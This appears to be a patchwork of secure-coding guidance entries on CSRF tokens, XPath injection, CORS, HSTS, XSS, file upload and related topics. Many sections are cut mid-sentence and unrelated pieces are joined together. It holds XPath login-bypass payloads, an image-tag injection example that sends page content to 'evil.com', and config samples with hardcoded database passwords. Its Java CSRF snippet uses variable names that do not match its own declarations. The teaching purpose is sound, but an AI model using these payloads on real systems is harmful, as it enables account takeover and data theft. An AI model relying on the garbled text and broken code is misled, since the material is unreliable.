	As you can see we also store the old passwords into the password forget table, this
	we do in order to prevent the user from using old passwords later on in the process.

	Also use a CRON job to make sure the generated tokens for the password reset are
	expire after a certain amount of time like 20 minutes.

	For CSRF tokens we used a separate class outside of the normal controller, since
	it must be reused on several locations throughout the application

	After a successful validation of a user login, the application must also start a session
	which contains the "cross site request forgery" token.

	From the Randomizer class we are generating the token we want by using a secure cryptographic function
	SecureRandom csprng = new SecureRandom();

	Then we generate a long value token containing a high entropy
	byte[] randomBytes  = new byte[128];

	prng.nextBytes(randombytes);

	Then we base64 encode the string
	String csrfToken = Base64.getEncoder().encodeToString(randomBytes);

	Then we set the session attribute.

	origRequest.getSession(false);
	origRequest.getSession().setAttribute("CSRF", csrfToken);

	The next step is to implement this random token in each form field as a hidden input parameter
	and send it to a function which checks if the submitted token is equal to the one set after successful validation.

	The following .xhtml snippet shows the code used to place the antiCSRF token inside the page.
	When the page renders, the <cu:antiCSRF/> is created as a viewstate encoded html input tag
	which then carries the antiCSRF token.
	While in process of rendering the page, a new token is generated
	and added into the existing session.
	When the user press the commandButton

			How to exploit : 
			
			With a normal username and password this XPath would work, but an attacker may send a bad username and password and get an XML node selected without knowing the username or password, like this:
			
			Username: blah'' or 1=1 or ''a''=''a
			Password: blah

			or if the following exploit used, it matches the first letter of the username which is A. In such case it just ignores the password and permits login. 
			
			username : '' or substring((//Employee[position()=1]/child::node()[position()=2]),1,1)="A" or ''''=''
			password : blah
			
			another exploitation example is using the following query which will be true if the second string (password) of the first node (user ''Arnold'') 
			consists of 36 characters (hash).
			
			stringlength(//user[position()=1]/child::node()[position()=2])=36 or ''''=''
			
			in order to test any of the above exploit cases just comment out the input validation lines 207 and 210 below.

 Example:

    
    // in order for the connection to be secure, it is best practice the credentials and all the relevant sensitive information about the database to be kept at the server configuration files. For this reason the following changes have been made at tomcat''s server.xml configuration file. 

    <Resource auth="Container" driverClassName="com.mysql.cj.jdbc.Driver" maxActive="100" maxIdle="30" maxWait="10000" name="jdbc/myJdbc" password="javadude" type="javax.sql.DataSource" url="jdbc:mysql://localhost:3306/aggregate_control" username="user"/>

    <Resource auth="Container" driverClassName="com.mysql.cj.jdbc.Driver" maxActive="100" maxIdle="30" maxWait="10000" name="jdbc/auditlogs_Jdbc" password="javadude" type="javax.sql.DataSource" url="jdbc:mysql://localhost:3306/auditlogs" username="user"/>

    the above configuration example indicates that there are two different mysql connections to the database. One refers to the auditlog database and the other refers to the aggregate_control database using the jdbc mysql connector. As you can see the mysql username and password are residing in the web application server configuration file.

    As for the server side code, in order to be informed of the existence of the databases, the following code must be located in the file /METAINF/context.xml

    <?xml version="1.0" encoding="UTF8"?>

    <Context path="/JServletSide" docBase="/JServletSide"
      crossContext="true" reloadable="true" debug="1">


    <Resource name="jdbc/myJdbc" auth="Container" type="javax.sql.DataSource"
              maxActive="100" maxIdle="30" maxWait="10000"
              username="user" password="javadude" 
              driverClassName="com.mysql.cj.jdbc.Driver"
              url="jdbc:mysql://localhost:3306/aggregate_control"/>

    <Resource name="jdbc/auditlogs_Jdbc" auth="Container" type="javax.sql.DataSource"
              maxActive="100" maxIdle="30" maxWait="10000"
              username="user" password="javadude" 
              driverClassName="com.mysql.cj.jdbc.Driver"
              url="jdbc:mysql://localhost:3306/auditlogs"/>
              </Context>

    The above snippet indicates the database  resource that will be use in the servlet in order to perform a successful connection to the database

    Afterwards the following servlet snippet will be used for the database connection. 

    Context initContext = new InitialContext();
    Context webContext  = (Context)initContext.lookup("java:/comp/env");
    DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
    Connection conn = ds.getConnection();

    the init context line refers to the database resource inside the context.xml file

    Also in order for the application to map the database reference we have to include the following lines inside the /WEBINF/web.xml 
    
    <resourceref>
        <description>DB Connection</description>
        <resrefname>jdbc/myJdbc</resrefname>

	Verify the system can protect against aggregate or continuous access of secured functions,

    PHP comes with the builtin function mail() for sending emails from a PHP application. The mail delivery can be configured by using the following five parameters.

    In order to use the mail() function in PHP, an email program or server has to be configured. The following two options can be used in the php.ini configuration file:

    1)Configure an SMTP server’s hostname and port to which PHP connects
    2)Configure the file path of a mail program that PHP uses as a Mail Transfer Agent (MTA)

    When PHP is configured with the second option, calls to the mail() function will result in the execution of the configured MTA program. Although PHP internally applies escapeshellcmd() to the program call which prevents an injection of new shell commands, the 5th argument $additional_parameters in mail() allows the addition of new program arguments to the MTA. Thus, an attacker can append program flags which in some MTA’s enables the creation of a file with usercontrolled content.

	// example so let''s cover the basics of enforcing the sequential steps.

	//
	// Step2: would be, the user adding products to checkout. Whenever he is done shopping
	// we''ll change the state of the Order

	// for a state machine, like Statesman (https://github.com/gocardless/statesman)
	// It even provides adapters for ActiveRecord models and can save the entire
	// state transition history for later audit.

	// First, we should create a state machine:

		state :checking_out
		state :purchased
		state :cancelled

		transition from: :pending,      to: [:checking_out, :cancelled]

		end

		def self.transition_class
			OrderTransition
		end

In information technology, a backup, or data backup, or the process of backing up, 
refers to the copying into an archive file of computer data that is already in 
secondary storage so that it may be used to restore the original after a data loss event. 

Solution:
Backups have two distinct purposes. The primary purpose is to recover data after its loss, 
be it by data deletion or corruption. Data loss can be a common experience of computer users. 

The secondary purpose of backups is to recover data from an earlier time, according to a 
userdefined data retention policy, typically configured within a backup application for how 
long copies of data are required. 

Though backups represent a simple form of disaster recovery 
and should be part of any disaster recovery plan, backups by themselves should not be considered
a complete disaster recovery plan. One reason for this is that not all backup systems are able to
reconstitute a computer system or other complex configuration such as a computer cluster, 
active directory server, or database server by simply restoring data from a backup.

In order to always poses over the latest state of your data it is recommended to do active syncing
between the application server and the backup service. Also, try to not only write recovery policies

In cryptography, a certificate authority or certification authority (CA) is an entity that
issues digital certificates. A digital certificate certifies the ownership of a public key
by the named subject of the certificate. Sometimes it happens that a CA goes bad and is
revoked from the browser. This will lead to untrusted TLS connections if your application
uses an issued certificate from this CA.

A selfsigned certificate is an identity certificate that is signed by the same entity whose identity it certifies. This term has nothing to do with the identity of the person or organization that actually performed the signing procedure. In technical terms a selfsigned certificate is one signed with its own private key.

In typical public key infrastructure (PKI) arrangements, a digital signature from a certificate authority (CA) attests that a particular public key certificate is valid. Each CA has one or more root keys; and the certificates associated with those public keys are "trust anchors" that use a special type of selfsigned certificates. Establishing trust of the CA root certificate is dependent upon procedures beyond checking its digital signature.

 Solution:

In a CA based PKI system, the CA must be trusted by both parties. This is usually accomplished by placing the CA certificates in a whitelist of trusted certificates. For example, web browsers developers may use procedures specified by the CA/Browser Forum, or a private CA''s certificate may be placed in the firmware of an embedded system. The trust issues of an entity accepting a new selfsigned certificate, is similar to the issues of an entity trusting the addition of a new CA certificate. The parties in a selfsigned PKI must establish trust with each other (using procedures outside the PKI), and confirm the accurate transfer of public keys (e.g. compare the hash out of band).

There are many subtle differences between CA signed and selfsigned certificates, especially in the amount of trust that can be placed in the security assertions of the certificate. Some CAs can verify the identity of the person to whom they issue a certificate; for example the US military issues their Common Access Cards in person, with multiple forms of other ID. The CA can attest identity values like these by including them in the signed certificate. The entity that validates the certificate can trust the information in that certificate, to the same extent that they trust the CA that signed it (and by implication, the security procedures the CA used to verify the attested information).

With a selfsigned certificate by contrast, trust of the values in the certificate are more complicated because the entity possesses the signing key, and can always generate a new certificate with different values. For example, the validity dates of a selfsigned certificate might not be trusted because the entity could always create and sign a new certificate that contained a valid date range. The values in a selfsigned certificate can be trusted when the following conditions are true: the values were (outofband) verified when the selfsigned was formally trusted, and there is a method to verify the selfsigned certificate has not changed after it was trusted. For example, the procedure of trusting a selfsigned certificate includes a manual verification of validity dates, and a hash of the certificate is incorporated into the white list. When the certificate is presented for an entity to validate, they first verify the hash of the certificate matches the reference hash in the whitelist, and if they match (indicating the selfsigned certificate is the same as the one that was formally trusted) then the certificate''s validity dates can be trusted. Special treatment of X.509 certificate fields for selfsigned certificate can be found in RFC 3280.

Verify that connections to and from the server use trusted TLS certificates. Where internally generated or selfsigned certificates are used, the server must be configured to only trust specific internal CAs and specific selfsigned certificates. All others should be rejected.

Some policies require users to change passwords periodically, often every 90 or 180 days. 
The benefit of password expiration, however, is debatable. Systems that implement such 
policies sometimes prevent users from picking a password too close to a previous selection.

This policy can often backfire. Some users find it hard to devise "good" passwords that are 
also easy to remember, so if people are required to choose many passwords because they have 
to change them often, they end up using much weaker passwords; the policy also encourages 
users to write passwords down. Also, if the policy prevents a user from repeating a recent password, 
this requires that there is a database in existence of everyone''s recent passwords (or their hashes) 
instead of having the old ones erased from memory. Finally, users may change their password repeatedly

3. exception

Access Control (or Authorization) is the process of granting or denying specific requests from a user, 
program, or process. Access control also involves the act of granting and revoking those privileges.

It should be noted that authorization (verifying access to specific features or resources) is not equivalent
to authentication (verifying identity).  

 Solution:

Attribute Based Access Control (ABAC) will grant or deny user requests based on arbitrary 
attributes of the user and arbitrary attributes of the object, and environment conditions 
that may be globally recognized and more relevant to the policies at hand. 

Once you have chosen a specific access control design pattern, it is often difficult and time
consuming to reengineer access control in your application with a new pattern. Access Control is
one of the main areas of application security design that must be thoroughly designed up front, 
especially when addressing requirements like multitenancy and horizontal (data dependent) access control.

```
if (user.hasRole("ADMIN")) || (user.hasRole("MANAGER")) {

An important aspect of secure application development is to prevent information leakage. 
Error messages give an attacker great insight into the inner workings of an application.

The purpose of reviewing the Error Handling code is to assure the application fails safely under all 
possible error conditions, expected and unexpected. No sensitive information is presented to the user 
when an error occurs.

When an exception or error is thrown we also need to log this occurrence. Sometimes this is due to bad
development, but it can be the result of an attack or some other service your application relies on failing.

All code paths that can cause an exception to be thrown should check for success in order for the exception 
not to be thrown.

 Solution:

We should use a localized description string in every exception, a friendly error reason such as “System Error – Please try again later”. When the user sees an error message, it will be derived from this description string of the exception that was thrown, and never from the exception class which may contain a stack trace, line number where the error occurred, 
class name or method name.

Do not expose sensitive information in exception messages. Information such as paths on the local file system is considered privileged information; any system internal information should be hidden from the user. As mentioned before an attacker could use this information to gather private user information from the application or components that make up the app.

Don’t put people’s names or any internal contact information in error messages. Don’t put any “human” information, which would lead to a level of familiarity and a social engineering exploit.

is or is not known on the system. This should prevent enumeration of email adresses.

Transport Layer Security (TLS), and its nowdeprecated predecessor, Secure Sockets Layer (SSL),
are cryptographic protocols designed to provide communications security over a computer network.
Several versions of the protocols find widespread use in applications such as web browsing, email,
instant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between
their servers and web browsers.

The TLS protocol aims primarily to provide privacy and data integrity between two or more
communicating computer applications.[2]:3 When secured by TLS, connections between a client 
(e.g., a web browser) and a server (e.g., wikipedia.org) should have one or more of the following properties:

The connection is private (or secure) because symmetric cryptography is used to encrypt the data transmitted. 
The keys for this symmetric encryption are generated uniquely for each connection and are based on a shared 
secret that was negotiated at the start of the session. The server and client negotiate 
the details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted. 
The negotiation of a shared secret is both secure (the negotiated secret is unavailable to eavesdroppers and cannot be 
obtained, even by an attacker who places themselves in the middle of the connection) and reliable 
(no attacker can modify the communications during the negotiation without being detected).

The identity of the communicating parties can be authenticated using publickey cryptography. 
This authentication can be made optional, but is generally required for at least one of the parties (typically the server).

The connection is reliable because each message transmitted includes a message integrity check using 
a message authentication code to prevent undetected loss or alteration of the data during transmission.

In addition to the properties above, careful configuration of TLS can provide additional privacyrelated properties 
such as forward secrecy, ensuring that any future disclosure of encryption keys cannot be used to decrypt any 
TLS communications recorded in the past

Description:

The CIA triad of confidentiality, integrity, and availability is at the heart of information security.

Confidentiality
In information security, confidentiality "is the property, that information
is not made available or disclosed to unauthorized individuals, entities, or processes." 
While similar to "privacy," the two words aren''t interchangeable. Rather, confidentiality 
is a component of privacy that implements to protect our data from unauthorized viewers.
Examples of confidentiality of electronic data being compromised include laptop theft, 
password theft, or sensitive emails being sent to the incorrect individuals.

Integrity
In information security, data integrity means maintaining and assuring the accuracy
and completeness of data over its entire lifecycle. This means that data cannot
be modified in an unauthorized or undetected manner. This is not the same thing as
referential integrity in databases, although it can be viewed as a special case of
consistency as understood in the classic ACID model of transaction processing.
Information security systems typically provide message integrity along side to confidentiality.

Availability
For any information system to serve its purpose, the information must be available when it is needed.
This means the computing systems used to store and process the information, 
the security controls used to protect it, and the communication channels used to
access it must be functioning correctly. High availability systems aim to remain available
at all times, preventing service disruptions due to power outages, hardware failures, 
and system upgrades. Ensuring availability also involves preventing denialofservice attacks, 
such as a flood of incoming messages to the target system, essentially forcing it to shut down.

protection level such as but not limited to.

A sandbox is a security mechanism for separating running programs.
It is often used to execute untested code, or untrusted programs from
unverified third parties, suppliers, untrusted users and untrusted websites. It''s creating
an extra layer of security where an attacker first needs to break out from.

 Solution:

Examples of sandbox implementations include the following:
A jail: networkaccess restrictions, and a restricted file system namespace. Jails are most commonly used in virtual hosting.
Rulebased execution gives users full control over what processes are started, spawned (by other applications), or allowed to inject code into other applications and have access to the net, by having the system assign access levels to users or programs according to a set of determined rules. It also can control file/registry security (what programs can read and write to the file system/registry). In such an environment, viruses and Trojans have fewer opportunities of infecting a computer. The SELinux and AppArmor security frameworks are two such implementations for Linux.
Virtual machines emulate a complete host computer, on which a conventional operating system may boot and run as on actual hardware. The guest operating system runs sandboxed in the sense that it does not function natively on the host and can only access host resources through the emulator.
Sandboxing on native hosts: Security researchers rely heavily on sandboxing technologies to analyze malware behavior  By creating an environment that mimics or replicates the targeted desktops, researchers can evaluate how malware infects and compromises a target host. Numerous malware analysis services are based on the sandboxing technology.
Capability systems can be thought of as a finegrained sandboxing mechanism, in which programs are given opaque tokens when spawned and have the ability to do specific things based on what tokens they hold. Capabilitybased implementations can work at various levels, from kernel to userspace. An example of capabilitybased userlevel sandboxing involves HTML rendering in a Web browser.
Secure Computing Mode (seccomp) is a sandbox built in the Linux kernel. When activated, seccomp only allows the write(), read(), exit(), and sigreturn() system calls.
HTML5 has a "sandbox" attribute for use with iframes.
Java virtual machines include a sandbox to restrict the actions of untrusted code, such as a Java applet.
The .NET Common Language Runtime provides Code Access Security to enforce restrictions on a untrusted code.

WYSIWYG editors can be a great risk to your web application since it allows direct

The first thing to take into consideration whenever you want to use WYSIWYG editors on

In cryptography, forward secrecy (FS; also known as perfect forward secrecy, or PFS) is a property of keyagreement protocols ensuring that a session key derived from a set of longterm keys cannot be compromised if one of the longterm keys is compromised in the future. The key used to protect the transmission of data must not be used to derive any additional keys, and if the key used to protect the transmission of data is derived from some other keying material, then that material must not be used to derive any more keys. In this way, compromise of a single key permits access only to data protected by that single key.

 Solution:

In the beginning SSL handshake, the client sends a list of supported cipher suites (among other things). The server then picks one of the cipher suites, based on a ranking, and tells the client which one they will be using.

Processing of an external entity containing tainted data may lead to the disclosure of confidential information and other system impacts. The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called an entity, which is a storage unit of some type. There exists a specific type of entity, an external general parsed entity often shortened to an external entity that can access local or remote content via a declared system identifier. The system identifier is assumed to be a URI that can be dereferenced (accessed) by the XML processor when processing the entity.
The XML processor then replaces occurrences of the named external entity with the contents dereferenced by the system identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted data, the XML processor may disclose confidential information normally not accessible by the application. Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.
Since the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via HTTP(s) requests. In some situations, an XML processor library that is vulnerable to clientside memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account.

 Solution:

Multifactor authentication (MFA) is a method of computer access control in which a user is granted access only after successfully presenting several separate pieces of evidence to an authentication mechanism – typically at least two of the following categories: knowledge (something they know), possession (something they have), and inherence (something they are)

The idle timeout limits the chances an attacker has to guess and use a valid session ID

the session periodically to keep the session active for longer periods of time.

prevents HTTPS click through prompts on browsers.

client. This "container" is signed by the server in order to avoid that a client tamper it in order to 
change, for example, the identity or any characteristics (example: change the role from simple user to 
admin or change the client login).

This token is created during authentication (is provided in case of successful authentication) and is

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting
a "dynamic file inclusion" mechanisms implemented in the target application.
The vulnerability occurs due to the use of usersupplied input without proper validation.


This can lead to something as outputting the contents of the file, but depending on the
severity, it can also lead to:

 Code execution on the web server
 Code execution on the clientside such as JavaScript which can lead to other attacks
  such as crosssite scripting (XSS)
 Denial of Service (DoS)
 Sensitive Information Disclosure


Local File Inclusion (also known as LFI) is the process of including files, that are
already locally present on the server, through the exploiting of vulnerable inclusion
procedures implemented in the application. This vulnerability occurs, for example, when a
page receives, as input, the path to the file that has to be included and this input is
not properly sanitized, allowing directory traversal characters (such as dotdotslash)
to be injected. Although most examples point to vulnerable PHP scripts, we should keep
in mind that it is also common in other technologies such as JSP, ASP and others.

 Solution:

The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way, there is no attack surface for malicious users to manipulate the path.

Also, disable the opportunity for the application to load remote resources. This is mostly achieved by adding a server configuration file such as php.ini or web.xml

want to do countering and logging on the user’s requests and input.

Every time the application gets userinput, whether this showing it on screen or processing
this data in the application background, these parameters should be escaped for malicious
code in order to prevent crosssite scripting injections.
When an attacker gains the possibility to perform an XSS injection,
he is given the opportunity to inject HTML and JavaScript code directly into the
application. This could lead to accounts being compromised by stealing session cookies or directly 
affect the operation of the target application. 

Altough templating engines(razor, twig, jinja, etc) and contextaware applications(Angular, React, etc)
do a lot of auto escaping for you. These frameworks should always be validated for effectiveness.


 Solution:

In order to prevent XSS injections, all userinput should be escaped or encoded.
You could start by sanitizing userinput as soon as it is inserted into the application,
by preference using a so called whitelisting method.
This means you should not check for malicious content like the tags or anything,
but only allow the expected input. Every input which is outside of the intended operation
of the application should immediately be detected and login rejected.
Do not try to help use the input in any way because that could introduce a new type of attack by converting characters. 

The second step would be encoding all the parameters or userinput before putting this in
your html with encoding libraries specially designed for this purpose.

You should take into consideration that there are several contexts for encoding userinput for
escaping XSS injections. These contexts are amongst others:

* HTML encoding, is for whenever your userinput is displayed directly into your HTML.
* HTML attribute encoding, is the type of encoding/escaping that should be applied 
  whenever your user input is displayed into the attribute of your HTML tags.
* HTML URL encoding, this type of encoding/escaping should be applied to whenever you are using userinput into a HREF tag.

JavaScript encoding should be used whenever parameters are rendered via JavaScript; your application will detect normal injections in the first instant. But your application still remains vulnerable to JavaScript encoding which will not be detected by the normal encoding/escaping methods.

HTTP Strict Transport Security (HSTS) is an optin security enhancement that is specified by a 
web application through the use of a special response header. Once a supported browser receives 
this header that browser will prevent any communications from being sent over HTTP to the specified 
domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers.

However, there is still a window where a user who has a fresh install, or who wipes out their local state,
is vulnerable. This is due to the fact that the browser is not yet aware of the fact if the application is trying to connect to supports HSTS. Whenever you are added to the preload list,
the application its preference is hardcoded into the browser and all first initial connections will
always be made by HTTPS.

 Solution:

In order to request for HSTS preloading, there are some requirements the application has to 
be complient with. The submission for the HSTS preloading can be performed on the following url:

    https://hstspreload.org/

Submission Requirements

If a site sends the preload directive in an HSTS header, it is considered to be requesting 
inclusion in the preload list and may be submitted via the form on this site.

In order to be accepted to the HSTS preload list the site must satisfy the following set of requirements:

1. Serve a valid certificate.
2. Redirect from HTTP to HTTPS on the same host, if you are listening on port 80.
3. Serve all subdomains over HTTPS.
    In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists.
5. Serve an HSTS header on the base domain for HTTPS requests:
    The maxage must be at least eighteen weeks (10886400 seconds).
    The includeSubDomains directive must be specified.
    The preload directive must be specified.
    If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS
     header (rather than the page it redirects to).

Now the following parameter can be added to the HSTS header,

maintained by Chrome (and used by Firefox and Safari), then use:
    StrictTransportSecurity: maxage=31536000; includeSubDomains; preload

The ''preload'' flag indicates the site owner''s consent to have their domain preloaded. The site owner
still needs to then go and submit the domain to the list.

 CAUTION:

Make sure to have a perfectly smooth certification management. Whenever there is no
valid certificate, the application can not be downgraded temporarily over HTTP. The failing of
the TLS certificate will lead to a DOS since HSTS does not allow the application to be visited over HTTP

Whenever the application detects malicious or unexpected userinput, you want to make sure
the application actual rejects the submitted userinput rather than directly process it.

 Solution:

Verify that the application actually rejects the user requests whenever malicious input
is detected by your application. The base of this process will be checking the application
for expected userinput, for example: Whenever the user is filling in a form which
contains a checkbox, there are fixed values which your application can expect from
the user to return. Whenever this value differs from what the application served the user
as possible answers, you can assume the request was corrupted and you reject the request.

You must also keep track of the users movements by adding an audit trail as well as a

violations are detected by your application in order to protect it from attackers.

attacks he could perform such as:

3. Form Rerouting
4. Base Jumping
5. Element Override
6. Hanging Textarea

Even when your application intercepts XSS injections by means of a content security policy
header it still remains vulnerable to the attacks summarized above.

 Solution:

1.Content spoofing Otherwise known as "Content Injection" or "Virtual Defacement" occurs whenever an attacker can inject code into your application. It is very important to sanitize and or encode user data before you display it on screen as HTML.

2.Image tag injection occurs whenever an attacker injects a broken image tag with a nonterminated parameter like: "img src=''http://evil.com?steal.php?value= Every content after value= parameter will now be stolen and send to evil.com by the attacker till the injection finds the next occurrence of a matching single quote.
Again you should sanitize and encode the user input to prevent an image tag from being injected in your application. For whenever a user is permitted to submit an image on your application enforce and verify the application accepts valid nonbroken tags only.

3.The "form" tag can''t be nested. The toplevel occurrence of this element always takes precedence over subsequent appearances. Again you must avoid this type by properly encoding and sanitizing your userinputs.

4.Whenever an attacker injects a "base" tag into your application it can steal data because the tag specifies the base URL/target to where to process the data to.
The solution to base jumping would be to use absolute paths in your application such as  action=''/update_profile.php''
instead of: action=''update_profile.php''

5/6 can both also easily be prevented simply be encoding or sanitizing your userinput submitted towards your application.
Always validate your user input on a high level(serverside constraint). Whenever your application expects an integer you should validate and check whether the user submitted input really is what you expected it to be and otherwise, you terminate and log the request.

 Solution:

These headers are also known as the: StrictTransportSecurity: maxage=16070400:
includeSubDomains and provide protection against SSL Strip attacks when implemented in the
application or web server.

When connecting to an HSTS host for the first time, the browser won''t know whether or not
to use a secure connection, because it has never received an HSTS header from that host.
Consequently, an active network attacker could prevent the browser from ever connecting
securely (and even worse, the user may never realize something is amiss). To mitigate
this attack, you can add your application to a preload list which makes HSTS enforced by default.
When a user connects to one of these hosts for the first time, the browser will know that
it must use a secure connection. If a network attacker prevents secure connections to the
server, the browser will not attempt to connect over an insecure protocol, thus

Cross Origin Resource Sharing or CORS is a mechanism that enables a web browser to perform
''crossdomain'' requests using the XMLHttpRequest L2 API in a controlled manner.
In the past, the XMLHttpRequest L1 API only allowed requests to be sent within the same
origin as it was restricted by the same origin policy.

 Solution:

CrossOrigin requests have an Origin header, that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use a web browser and a server to determine whether a crossorigin request is allowed. In order to accomplish this goal, there are a few HTTP headers involved in this process, that are supported by all major browsers:

 Origin
 AccessControlRequestMethod
 AccessControlRequestHeaders
 AccessControlAllowOrigin
 AccessControlAllowCredentials
 AccessControlAllowMethods
 AccessControlAllowHeaders

Things you must consider when using CORS

1. Validate URLs passed to XMLHttpRequest.open. Current browsers allow these URLs to be
cross domain; this behavior can lead to code injection by a remote attacker. Pay extra
attention to absolute URLs.

2. Ensure that URLs responding with AccessControlAllowOrigin: * do not include any
sensitive content or information that might aid an attacker in further attacks.
Use the AccessControlAllowOrigin header only on chosen URLs that need to be
accessed crossdomain. Don''t use the header for the whole domain.

3. Allow only selected, trusted domains in the AccessControlAllowOrigin header.
Prefer whitelisting domains over blacklisting or allowing any domain
(do not use * wildcard nor blindly return the Origin header content without any checks)

4. Keep in mind that CORS does not prevent the requested data from going to an
unauthenticated location. It''s still important for the server to perform usual
CSRF prevention.

5. While the RFC recommends a preflight request with the OPTIONS verb, current
implementations might not perform this request, so it''s important that "ordinary"
(GET and POST) requests perform any access control necessary.

6. Discard requests received over plain HTTP with HTTPS origins to prevent mixed
content bugs.

7. Don''t rely only on the Origin header for Access Control checks. Browser always sends
this header in CORS requests, but may be spoofed outside the browser.
Applicationlevel protocols should be used to protect sensitive data.

**NOTE:** 
Modern application frameworks do dynamically allocation of the origin header, resulting in the browser
also allowing to send the "AccessControlAllowCredentials: true" header as well in requests.

Pinning is the process of associating a host with their expected X509 certificate or
public key. Once a certificate or public key is known or seen for a host, the certificate
or public key is associated or ''pinned'' to the host. If more than one certificate or
public key is acceptable, then the program holds a pinset
(taking from Jon Larimer and Kenny Root Google I/O talk). In this case, the advertised
identity must match one of the elements in the pinset.

 Solution:

The idea is to reuse the existing protocols and infrastructure, but use them in a
hardened manner. For reuse, a program would keep doing the things it used to do when
establishing a secure connection.

To harden the channel, the program would take advantage of the OnConnect callback offered
by a library, framework or platform. In the callback, the program would verify the
remote host''s identity by validating its certificate or public key. While pinning does
not have to occur in an OnConnect callback, it is often most convenient because the
underlying connection information is readily available.

Type checking, length checking and whitelisting is an essential in defense in depth strategie to make
your application more resiliant against input injection attacks.

Example:
    ```
    SELECT * FROM pages WHERE id=mysql_real_escape_string($_GET[''id''])
    ```
    
This PHP example did effectively not mitigate the SQL injection. This was due to the fact
that it only escaped string based SQL injection. 

Now, if this application also had additional checks to validate if the value of 
the $_GET[''id''] parameter was indeed as expected an integer and rejected if this condition was false, 
the attack would effectively been mitigated.


 Solution

All the user supplied input that works outside of the intended opteration of the application
should be rejected by the application.

Syntax and Semantic Validity
An application should check that data is both syntactically and semantically 
valid (in that order) before using it in any way (including displaying it back to the user). 

Syntax validity, means that the data is in the form that is expected. For example, an application
may allow a user to select a fourdigit “account ID” to perform some kind of operation. 
The application should assume the user is entering a SQL injection payload, and should 
check that the data entered by the user is exactly four digits in length, and consists only of numbers 
(in addition to utilizing proper query parameterization).

Semantic validity, includes only accepting input that is within an acceptable range for the
given application functionality and context. For example, a start date must be before an end
date when choosing date ranges.

Reflective file download occurs whenever an attacker can "forge" a download through misconfiguration in your "disposition" and "content type" headers. Instead of having the attacker to upload an evil file to the web server he can now force the browser to download a malicious file by abusing these headers and setting the file extension to any type he wants.

Now, whenever there is also userinput being reflected back into that download it can be used to forge evil attacks. The attacker can present an evil file to ignorant victim''s who are trusting the domain of which the download was presented from.

File download injection is a similar type of attack except this attack is made possible whenever there is userinput that is reflected into the "filename=" parameter in the "disposition" header.

 Solution:

First, never use user input directly into your headers since an attacker can now take control over it.

Secondly, you should check if a filename really does exist before presenting it towards the users. You could also create a whitelist of all files which are allowed to be downloaded and terminate requests whenever they do not match.

There are two popular methods for handling input validation. The first is blacklisting and the second one is the whitelisting method, also known as a positive validation model.
The big disadvantage of the blacklisting model would be that an attacker has a great diversity into forging his attack strings and payloads which can make it hard for your application to detect all of them. It would be very time consuming importing them all into your system.
Whenever you are using a positive validation model you are simply checking for the input you were expecting as defined in your application’s operation, for example:

Let''s say you have a form and were expecting it to return the value of a checkbox. This would be a fixed value, yes or no? Whenever the value diverges from the expected input in the applications operation you can assume there was an intercepting proxy tampering these values and act accordingly to it. 
Same goes for whenever you were expecting just a string, integer, alphanumeric character or even special strings such as names as O’Reily.

Uploaded files represent a significant risk to applications.
The first step in many attacks is to get some code to the system to be attacked.
Then the attack only needs to find a way to get the code executed. Using a file upload
helps the attacker accomplish the first step.

The consequences of unrestricted file upload can vary, including complete system takeover,
an overloaded file system or database, forwarding attacks to backend systems, and simple
defacement.

There are really two classes of problems here.
The first is with the file metadata, like the path and file name.
These are generally provided by the transport, such as HTTP multipart encoding.
This data may trick the application into overwriting a critical file or storing the file
in a bad location. You must validate the metadata extremely carefully before using it.

The other class of problem is with the file size or content.
An attacker can easily craft a valid image file with PHP code inside.

 Solution:

 Uploaded files always need to be placed outside the document root of the webserver
 Check to not accept large files that could fill up storage or cause a denial of service attack
 Check the userinput(filename) for having the right allowed extensions such as .jpg, .png etc
  Note: when checking these extensions always make sure your application validates the last
  possible extension so an attacker could not simply inject ".jpg.php" and bypass your
  validation

 Check the userinput(filename) for containing possible path traversal patterns in order to prevent him from uploading outside of the intended directory.

You may also want to check if the filenames do already exist before uploading in order to
prevent the overwriting of files.

Also for serving the files back there needs to be a file handler function that can select
the file based on an identifier that will serve the file back towards the user.

Most developers also do a mimetype check. This is a good protection however not
whenever you are checking this mimetype through the post request. This header can not be

The principle of least privilege recommends that accounts have the least amount of

 Solution:

The principle means giving a user account only those privileges which are essential to
that user’s work. For example, a backup user does not need to install software: hence,
the backup user has rights only to run backup and backuprelated applications.
Any other privileges, such as installing new software, are blocked.

The principle applies also to a personal computer user who usually does work in a normal
user account, and opens a privileged, password protected account (that is, a superuser)
only when the situation absolutely demands it.

on role based authentication methods using sessions, we rather want to assign privileges
to users by means of a DatabaseBased Authentication system.

instead of assigning that user with a specific role we assign him with privileges to
verify which actions he is privileged to perform on the system.

predefinition of specific deliverables and artifacts that are created and completed by a 
project team to develop or maintain an application

In this software security development lifecycle we can also integrate security test automation and
other quality pilars for security.

 Solution:

The secure software development lifecycle ideally consists out of 5 different stages namely:

* Training and awareness
* Security requirements
* Test automation (unit testing, sonarqube, e2e testing, etc)
* Security test automation (SAST, DAST, IAST, RASP, ETC)
* Secure code review, penetration test

There are a lot of ways to achieve a good (S)SDLC, the most important thing to keep into
consideration is that you need to have a scalable solution that works over different CI
envorinments. Also keep in mind that your CI/CD pipeline is a production environment that
delivers production environments. So your CI/CD pipelines should be hardened as well as any other 
application.  Keep into consideration things like

 Monitoring on your pipeline
 Secret management
 Hardening of containers
 Hardening of your CI environment

Verify that account passwords are one way hashed with a salt, and there is sufficient work 
factor to defeat brute force and password hash recovery attacks.

 Solution:

Recommended for password usage are PBKDF functions. PBKDF2 uses a pseudorandom function 
and a configurable number of iterations to derive a cryptographic key from a password. 
